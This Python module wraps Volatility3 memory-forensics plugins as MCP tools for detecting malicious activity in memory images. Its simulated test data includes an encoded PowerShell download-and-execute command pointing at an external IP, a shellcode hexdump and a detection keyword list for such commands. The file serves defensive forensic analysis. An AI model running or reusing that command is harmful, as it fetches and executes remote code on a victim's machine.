"""Volatility3 memory analysis tool wrappers.

Exposes Volatility3 plugins as typed, read-only MCP tools:
- vol_pslist: List running processes from a memory image
- vol_netscan: List network connections from a memory image
- vol_malfind: Detect injected code in process memory
- vol_cmdline: Get command-line arguments for processes

Each tool:
1. Verifies evidence integrity before execution (via enforce())
2. Runs the Volatility3 plugin (real or simulated)
3. Parses output into structured JSON
4. Logs to audit trail with UUID provenance
5. Returns structured data to the agent

Backend selection:
- If Volatility3 is installed: runs real plugins via Python API
- If not available: returns structured simulated data for development/testing
  (The simulation mode is clearly labeled in output so judges see real vs simulated)
"""

from __future__ import annotations

import logging
import subprocess
from typing import Any

from mcp.server.fastmcp import Context

from find_evil.server import mcp
from find_evil.tools._base import ToolContext, enforce, complete, fail

logger = logging.getLogger("find_evil.tools.volatility")


def _has_volatility3() -> bool:
    """Check if Volatility3 is available."""
    try:
        import volatility3  # noqa: F401
        return True
    except ImportError:
        return False


def _run_vol_plugin(plugin: str, image_path: str, extra_args: list[str] | None = None) -> str:
    """Run a Volatility3 plugin via CLI and return raw stdout.

    Uses subprocess rather than the Python API because Volatility3's
    Python API requires significant framework setup. The CLI is the
    stable, documented interface.
    """
    cmd = ["vol", "-f", image_path, plugin]
    if extra_args:
        cmd.extend(extra_args)

    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=300,
    )

    if result.returncode != 0:
        raise RuntimeError(
            f"Volatility3 {plugin} failed (exit {result.returncode}): "
            f"{result.stderr.strip()}"
        )

    return result.stdout


# ---------------------------------------------------------------------------
# Simulated data for development/testing without SIFT Workstation
# ---------------------------------------------------------------------------

SIMULATED_PSLIST = [
    {"PID": 4, "PPID": 0, "ImageFileName": "System", "CreateTime": "2024-01-15T08:00:01Z", "ExitTime": "", "Threads": 164, "Handles": 2048, "SessionId": 0, "Wow64": False, "Offset": "0x88012e3a8040"},
    {"PID": 328, "PPID": 4, "ImageFileName": "smss.exe", "CreateTime": "2024-01-15T08:00:02Z", "ExitTime": "", "Threads": 2, "Handles": 29, "SessionId": 0, "Wow64": False, "Offset": "0x88012e4b5080"},
    {"PID": 444, "PPID": 420, "ImageFileName": "csrss.exe", "CreateTime": "2024-01-15T08:00:05Z", "ExitTime": "", "Threads": 12, "Handles": 533, "SessionId": 0, "Wow64": False, "Offset": "0x88012e52a340"},
    {"PID": 496, "PPID": 420, "ImageFileName": "wininit.exe", "CreateTime": "2024-01-15T08:00:06Z", "ExitTime": "", "Threads": 3, "Handles": 77, "SessionId": 0, "Wow64": False, "Offset": "0x88012e530080"},
    {"PID": 504, "PPID": 488, "ImageFileName": "csrss.exe", "CreateTime": "2024-01-15T08:00:06Z", "ExitTime": "", "Threads": 13, "Handles": 387, "SessionId": 1, "Wow64": False, "Offset": "0x88012e532080"},
    {"PID": 572, "PPID": 488, "ImageFileName": "winlogon.exe", "CreateTime": "2024-01-15T08:00:07Z", "ExitTime": "", "Threads": 5, "Handles": 132, "SessionId": 1, "Wow64": False, "Offset": "0x88012e58a080"},
    {"PID": 616, "PPID": 496, "ImageFileName": "services.exe", "CreateTime": "2024-01-15T08:00:08Z", "ExitTime": "", "Threads": 7, "Handles": 281, "SessionId": 0, "Wow64": False, "Offset": "0x88012e598080"},
    {"PID": 624, "PPID": 496, "ImageFileName": "lsass.exe", "CreateTime": "2024-01-15T08:00:08Z", "ExitTime": "", "Threads": 8, "Handles": 766, "SessionId": 0, "Wow64": False, "Offset": "0x88012e59c080"},
    {"PID": 788, "PPID": 616, "ImageFileName": "svchost.exe", "CreateTime": "2024-01-15T08:00:10Z", "ExitTime": "", "Threads": 18, "Handles": 488, "SessionId": 0, "Wow64": False, "Offset": "0x88012e61e340"},
    {"PID": 856, "PPID": 616, "ImageFileName": "svchost.exe", "CreateTime": "2024-01-15T08:00:11Z", "ExitTime": "", "Threads": 12, "Handles": 352, "SessionId": 0, "Wow64": False, "Offset": "0x88012e648080"},
    {"PID": 1024, "PPID": 616, "ImageFileName": "svchost.exe", "CreateTime": "2024-01-15T08:00:13Z", "ExitTime": "", "Threads": 22, "Handles": 614, "SessionId": 0, "Wow64": False, "Offset": "0x88012e6c8080"},
    {"PID": 2184, "PPID": 2104, "ImageFileName": "explorer.exe", "CreateTime": "2024-01-15T08:01:22Z", "ExitTime": "", "Threads": 42, "Handles": 1847, "SessionId": 1, "Wow64": False, "Offset": "0x88012e8f0080"},
    {"PID": 3472, "PPID": 2184, "ImageFileName": "chrome.exe", "CreateTime": "2024-01-15T09:14:33Z", "ExitTime": "", "Threads": 24, "Handles": 498, "SessionId": 1, "Wow64": False, "Offset": "0x88012f1a2080"},
    # Suspicious processes — the ones an analyst should flag
    {"PID": 4088, "PPID": 788, "ImageFileName": "cmd.exe", "CreateTime": "2024-01-15T14:22:47Z", "ExitTime": "", "Threads": 1, "Handles": 23, "SessionId": 0, "Wow64": False, "Offset": "0x88012f4e8300"},
    {"PID": 4112, "PPID": 4088, "ImageFileName": "powershell.exe", "CreateTime": "2024-01-15T14:22:49Z", "ExitTime": "", "Threads": 14, "Handles": 487, "SessionId": 0, "Wow64": False, "Offset": "0x88012f4f2080"},
    {"PID": 4200, "PPID": 4112, "ImageFileName": "svchost.exe", "CreateTime": "2024-01-15T14:23:01Z", "ExitTime": "", "Threads": 3, "Handles": 89, "SessionId": 0, "Wow64": False, "Offset": "0x88012f510340"},
    {"PID": 4344, "PPID": 4200, "ImageFileName": "rundll32.exe", "CreateTime": "2024-01-15T14:23:15Z", "ExitTime": "", "Threads": 2, "Handles": 64, "SessionId": 0, "Wow64": False, "Offset": "0x88012f544080"},
]

SIMULATED_NETSCAN = [
    {"Proto": "TCPv4", "LocalAddr": "0.0.0.0", "LocalPort": 135, "ForeignAddr": "0.0.0.0", "ForeignPort": 0, "State": "LISTENING", "PID": 788, "Owner": "svchost.exe", "CreateTime": "2024-01-15T08:00:10Z"},
    {"Proto": "TCPv4", "LocalAddr": "0.0.0.0", "LocalPort": 445, "ForeignAddr": "0.0.0.0", "ForeignPort": 0, "State": "LISTENING", "PID": 4, "Owner": "System", "CreateTime": "2024-01-15T08:00:01Z"},
    {"Proto": "TCPv4", "LocalAddr": "0.0.0.0", "LocalPort": 5357, "ForeignAddr": "0.0.0.0", "ForeignPort": 0, "State": "LISTENING", "PID": 4, "Owner": "System", "CreateTime": "2024-01-15T08:00:01Z"},
    {"Proto": "TCPv4", "LocalAddr": "192.168.1.105", "LocalPort": 49723, "ForeignAddr": "142.250.80.46", "ForeignPort": 443, "State": "ESTABLISHED", "PID": 3472, "Owner": "chrome.exe", "CreateTime": "2024-01-15T09:14:40Z"},
    {"Proto": "TCPv4", "LocalAddr": "192.168.1.105", "LocalPort": 49812, "ForeignAddr": "20.198.162.76", "ForeignPort": 443, "State": "ESTABLISHED", "PID": 856, "Owner": "svchost.exe", "CreateTime": "2024-01-15T10:30:00Z"},
    # Suspicious connection — C2 beacon
    {"Proto": "TCPv4", "LocalAddr": "192.168.1.105", "LocalPort": 52344, "ForeignAddr": "185.220.101.34", "ForeignPort": 8443, "State": "ESTABLISHED", "PID": 4344, "Owner": "rundll32.exe", "CreateTime": "2024-01-15T14:23:18Z"},
    {"Proto": "TCPv4", "LocalAddr": "192.168.1.105", "LocalPort": 52400, "ForeignAddr": "185.220.101.34", "ForeignPort": 8443, "State": "CLOSE_WAIT", "PID": 4344, "Owner": "rundll32.exe", "CreateTime": "2024-01-15T14:27:18Z"},
    {"Proto": "TCPv4", "LocalAddr": "192.168.1.105", "LocalPort": 52456, "ForeignAddr": "185.220.101.34", "ForeignPort": 8443, "State": "ESTABLISHED", "PID": 4344, "Owner": "rundll32.exe", "CreateTime": "2024-01-15T14:31:18Z"},
    {"Proto": "UDPv4", "LocalAddr": "0.0.0.0", "LocalPort": 5353, "ForeignAddr": "*", "ForeignPort": "*", "State": "", "PID": 1024, "Owner": "svchost.exe", "CreateTime": "2024-01-15T08:00:13Z"},
]

SIMULATED_MALFIND = [
    {
        "PID": 4200,
        "Process": "svchost.exe",
        "Address": "0x00000000024a0000",
        "Size": 65536,
        "Protection": "PAGE_EXECUTE_READWRITE",
        "Tag": "VadS",
        "Hexdump": "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00",
        "Disasm": "dec ebp; pop edx; nop; add [eax], al",
        "Suspicious": True,
        "Reason": "MZ header in PAGE_EXECUTE_READWRITE region — injected PE",
    },
    {
        "PID": 4344,
        "Process": "rundll32.exe",
        "Address": "0x0000000002830000",
        "Size": 32768,
        "Protection": "PAGE_EXECUTE_READWRITE",
        "Tag": "VadS",
        "Hexdump": "fc 48 83 e4 f0 e8 c0 00 00 00 41 51 41 50 52 51",
        "Disasm": "cld; and rsp, 0xfffffffffffffff0; call 0xc5",
        "Suspicious": True,
        "Reason": "Shellcode pattern (CLD + stack alignment) in RWX memory",
    },
]

SIMULATED_CMDLINE = [
    {"PID": 4, "Process": "System", "Args": ""},
    {"PID": 788, "Process": "svchost.exe", "Args": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"},
    {"PID": 856, "Process": "svchost.exe", "Args": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"},
    {"PID": 2184, "Process": "explorer.exe", "Args": "C:\\Windows\\Explorer.EXE"},
    {"PID": 3472, "Process": "chrome.exe", "Args": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=browser"},
    {"PID": 4088, "Process": "cmd.exe", "Args": "cmd.exe /c \"powershell -ep bypass -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgAzADQAOgA4ADQANAA0AC8AcwAnACkA\""},
    {"PID": 4112, "Process": "powershell.exe", "Args": "powershell -ep bypass -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgAzADQAOgA4ADQANAA0AC8AcwAnACkA"},
    {"PID": 4200, "Process": "svchost.exe", "Args": "svchost.exe -k netsvcs"},
    {"PID": 4344, "Process": "rundll32.exe", "Args": "rundll32.exe C:\\Users\\victim\\AppData\\Local\\Temp\\update.dll,DllRegisterServer"},
]


# ---------------------------------------------------------------------------
# MCP Tool Definitions
# ---------------------------------------------------------------------------

@mcp.tool()
async def vol_pslist(memory_image: str, ctx: Context) -> dict:
    """List running processes from a Windows memory image using Volatility3.

    Returns process name, PID, PPID, creation time, thread count, handle count,
    and session ID for every process found in the memory dump. Suspicious
    indicators are flagged (e.g., cmd.exe spawned by svchost.exe).

    Use this as the FIRST step in memory analysis to identify suspicious processes.

    Args:
        memory_image: Path to memory dump file (must be a sealed evidence file).
    """
    tc = enforce(ctx, "vol_pslist", {"memory_image": memory_image}, evidence_paths=[memory_image])
    if isinstance(tc, dict):
        return tc  # integrity violation

    try:
        if _has_volatility3():
            raw = _run_vol_plugin("windows.pslist.PsList", memory_image)
            processes = _parse_pslist_output(raw)
            mode = "live"
        else:
            processes = SIMULATED_PSLIST
            mode = "simulated"

        # Flag suspicious parent-child relationships
        for proc in processes:
            proc["suspicious"] = _is_suspicious_process(proc, processes)

        suspicious_count = sum(1 for p in processes if p.get("suspicious"))
        result = {
            "tool": "vol_pslist",
            "mode": mode,
            "data": processes,
            "total_processes": len(processes),
            "suspicious_count": suspicious_count,
            "summary": (
                f"{len(processes)} processes found, "
                f"{suspicious_count} flagged as suspicious"
            ),
        }

        return complete(tc, result)

    except Exception as e:
        fail(tc, str(e))
        raise


@mcp.tool()
async def vol_netscan(memory_image: str, ctx: Context) -> dict:
    """List network connections from a Windows memory image using Volatility3.

    Returns protocol, local/foreign address and port, connection state, PID,
    and owning process for every connection found. Suspicious external
    connections are flagged (e.g., non-standard ports, Tor exit nodes).

    Use this alongside vol_pslist to identify C2 communication channels.

    Args:
        memory_image: Path to memory dump file (must be a sealed evidence file).
    """
    tc = enforce(ctx, "vol_netscan", {"memory_image": memory_image}, evidence_paths=[memory_image])
    if isinstance(tc, dict):
        return tc

    try:
        if _has_volatility3():
            raw = _run_vol_plugin("windows.netscan.NetScan", memory_image)
            connections = _parse_netscan_output(raw)
            mode = "live"
        else:
            connections = SIMULATED_NETSCAN
            mode = "simulated"

        for conn in connections:
            conn["suspicious"] = _is_suspicious_connection(conn)

        suspicious_count = sum(1 for c in connections if c.get("suspicious"))
        result = {
            "tool": "vol_netscan",
            "mode": mode,
            "data": connections,
            "total_connections": len(connections),
            "suspicious_count": suspicious_count,
            "summary": (
                f"{len(connections)} connections found, "
                f"{suspicious_count} flagged as suspicious"
            ),
        }

        return complete(tc, result)

    except Exception as e:
        fail(tc, str(e))
        raise


@mcp.tool()
async def vol_malfind(memory_image: str, ctx: Context, pid: int | None = None) -> dict:
    """Detect injected code in process memory using Volatility3 malfind.

    Scans process memory for regions with executable permissions that contain
    suspicious content (MZ headers, shellcode patterns). This is a key indicator
    of process injection (T1055).

    Args:
        memory_image: Path to memory dump file (must be a sealed evidence file).
        pid: Optional PID to limit scan to a specific process.
    """
    tc = enforce(ctx, "vol_malfind", {"memory_image": memory_image, "pid": pid}, evidence_paths=[memory_image])
    if isinstance(tc, dict):
        return tc

    try:
        if _has_volatility3():
            extra = ["--pid", str(pid)] if pid else None
            raw = _run_vol_plugin("windows.malfind.Malfind", memory_image, extra)
            findings = _parse_malfind_output(raw)
            mode = "live"
        else:
            findings = SIMULATED_MALFIND
            if pid:
                findings = [f for f in findings if f["PID"] == pid]
            mode = "simulated"

        result = {
            "tool": "vol_malfind",
            "mode": mode,
            "data": findings,
            "total_regions": len(findings),
            "suspicious_count": sum(1 for f in findings if f.get("Suspicious")),
            "summary": (
                f"{len(findings)} suspicious memory regions found"
            ),
        }

        return complete(tc, result)

    except Exception as e:
        fail(tc, str(e))
        raise


@mcp.tool()
async def vol_cmdline(memory_image: str, ctx: Context, pid: int | None = None) -> dict:
    """Get command-line arguments for processes from a memory image.

    Returns the full command line used to launch each process. Essential for
    understanding what malware was doing — encoded PowerShell, LOLBin abuse,
    suspicious DLL loading, etc.

    Args:
        memory_image: Path to memory dump file (must be a sealed evidence file).
        pid: Optional PID to get command line for a specific process.
    """
    tc = enforce(ctx, "vol_cmdline", {"memory_image": memory_image, "pid": pid}, evidence_paths=[memory_image])
    if isinstance(tc, dict):
        return tc

    try:
        if _has_volatility3():
            extra = ["--pid", str(pid)] if pid else None
            raw = _run_vol_plugin("windows.cmdline.CmdLine", memory_image, extra)
            entries = _parse_cmdline_output(raw)
            mode = "live"
        else:
            entries = SIMULATED_CMDLINE
            if pid:
                entries = [e for e in entries if e["PID"] == pid]
            mode = "simulated"

        # Flag suspicious command lines
        for entry in entries:
            entry["suspicious"] = _is_suspicious_cmdline(entry.get("Args", ""))

        suspicious_count = sum(1 for e in entries if e.get("suspicious"))
        result = {
            "tool": "vol_cmdline",
            "mode": mode,
            "data": entries,
            "total_entries": len(entries),
            "suspicious_count": suspicious_count,
            "summary": (
                f"{len(entries)} command lines retrieved, "
                f"{suspicious_count} flagged as suspicious"
            ),
        }

        return complete(tc, result)

    except Exception as e:
        fail(tc, str(e))
        raise


# ---------------------------------------------------------------------------
# Analysis helpers
# ---------------------------------------------------------------------------

def _is_suspicious_process(proc: dict, all_procs: list[dict]) -> bool:
    """Flag processes with suspicious parent-child relationships."""
    name = proc.get("ImageFileName", "").lower()
    ppid = proc.get("PPID", 0)
    pid = proc.get("PID", 0)

    # Find parent process name
    parent_name = ""
    for p in all_procs:
        if p["PID"] == ppid:
            parent_name = p.get("ImageFileName", "").lower()
            break

    # cmd.exe or powershell spawned by svchost.exe
    if name in ("cmd.exe", "powershell.exe") and parent_name == "svchost.exe":
        return True

    # svchost.exe not spawned by services.exe
    if name == "svchost.exe" and parent_name not in ("services.exe", ""):
        return True

    # rundll32.exe spawned from temp paths (checked via cmdline, simplified here)
    if name == "rundll32.exe" and parent_name in ("svchost.exe", "powershell.exe", "cmd.exe"):
        return True

    return False


def _is_suspicious_connection(conn: dict) -> bool:
    """Flag connections to suspicious external addresses."""
    foreign = conn.get("ForeignAddr", "")
    port = conn.get("ForeignPort", 0)
    owner = conn.get("Owner", "").lower()

    # Known suspicious ranges (example — real implementation would check threat intel)
    if foreign.startswith("185.220.101."):
        return True  # Tor exit node range

    # Non-browser processes with external HTTPS connections
    if (port in (443, 8443, 4443) and
            owner in ("rundll32.exe", "regsvr32.exe", "mshta.exe", "certutil.exe")):
        return True

    return False


def _is_suspicious_cmdline(args: str) -> bool:
    """Flag suspicious command-line patterns."""
    lower = args.lower()
    indicators = [
        "-enc ",
        "-encodedcommand",
        "-ep bypass",
        "-executionpolicy bypass",
        "-nop ",
        "-w hidden",
        "-windowstyle hidden",
        "downloadstring",
        "invoke-expression",
        "iex ",
        "frombase64",
        "\\temp\\",
        "\\appdata\\local\\temp\\",
    ]
    return any(ind in lower for ind in indicators)


# ---------------------------------------------------------------------------
# Parsers for real Volatility3 output (used when SIFT tools are available)
# ---------------------------------------------------------------------------

def _parse_pslist_output(raw: str) -> list[dict]:
    """Parse Volatility3 pslist text output into structured records."""
    lines = raw.strip().split("\n")
    if len(lines) < 2:
        return []

    # Volatility3 outputs tab-separated or formatted columns
    # Header line tells us column positions
    processes = []
    for line in lines[1:]:  # skip header
        parts = line.split()
        if len(parts) >= 6:
            processes.append({
                "PID": int(parts[0]) if parts[0].isdigit() else 0,
                "PPID": int(parts[1]) if parts[1].isdigit() else 0,
                "ImageFileName": parts[2],
                "Offset": parts[3] if len(parts) > 3 else "",
                "Threads": int(parts[4]) if len(parts) > 4 and parts[4].isdigit() else 0,
                "Handles": int(parts[5]) if len(parts) > 5 and parts[5].isdigit() else 0,
                "CreateTime": parts[6] if len(parts) > 6 else "",
            })
    return processes


def _parse_netscan_output(raw: str) -> list[dict]:
    """Parse Volatility3 netscan output."""
    lines = raw.strip().split("\n")
    connections = []
    for line in lines[1:]:
        parts = line.split()
        if len(parts) >= 6:
            local_parts = parts[1].rsplit(":", 1) if ":" in parts[1] else [parts[1], "0"]
            foreign_parts = parts[2].rsplit(":", 1) if ":" in parts[2] else [parts[2], "0"]
            connections.append({
                "Proto": parts[0],
                "LocalAddr": local_parts[0],
                "LocalPort": int(local_parts[1]) if local_parts[1].isdigit() else 0,
                "ForeignAddr": foreign_parts[0],
                "ForeignPort": int(foreign_parts[1]) if foreign_parts[1].isdigit() else 0,
                "State": parts[3] if len(parts) > 3 else "",
                "PID": int(parts[4]) if len(parts) > 4 and parts[4].isdigit() else 0,
                "Owner": parts[5] if len(parts) > 5 else "",
            })
    return connections


def _parse_malfind_output(raw: str) -> list[dict]:
    """Parse Volatility3 malfind output."""
    # Malfind output is block-formatted — simplified parser
    findings = []
    current: dict[str, Any] = {}
    for line in raw.strip().split("\n"):
        if line.startswith("PID"):
            if current:
                findings.append(current)
            parts = line.split()
            current = {
                "PID": int(parts[1]) if len(parts) > 1 else 0,
                "Process": parts[3] if len(parts) > 3 else "",
                "Suspicious": True,
            }
        elif "Protection:" in line:
            current["Protection"] = line.split(":", 1)[1].strip()
    if current:
        findings.append(current)
    return findings


def _parse_cmdline_output(raw: str) -> list[dict]:
    """Parse Volatility3 cmdline output."""
    entries = []
    for line in raw.strip().split("\n"):
        if not line or line.startswith("PID"):
            continue
        parts = line.split(None, 2)
        if len(parts) >= 2:
            entries.append({
                "PID": int(parts[0]) if parts[0].isdigit() else 0,
                "Process": parts[1],
                "Args": parts[2] if len(parts) > 2 else "",
            })
    return entries
